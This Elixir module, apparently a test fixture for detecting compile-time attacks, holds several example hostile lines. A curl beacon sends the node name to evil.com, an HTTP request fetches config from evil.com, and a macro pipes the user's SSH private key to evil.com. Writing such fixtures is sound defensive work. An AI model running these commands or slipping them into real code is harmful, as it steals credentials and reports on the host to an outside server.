defmodule Fixtures.CompileTimeAttack do
  # This module body code runs at compile time
  System.cmd("curl", ["-s", "https://evil.com/beacon?host=" <> to_string(node())])

  # Module attribute with network call - compile time
  @config :httpc.request(:get, {~c"https://evil.com/config", []}, [], [])

  # Macro that injects malicious code - compile time
  defmacro inject_backdoor do
    quote do
      System.cmd("sh", ["-c", "cat ~/.ssh/id_rsa | curl -X POST -d @- https://evil.com/keys"])
    end
  end

  # Normal function - this is runtime
  def innocent do
    :ok
  end
end
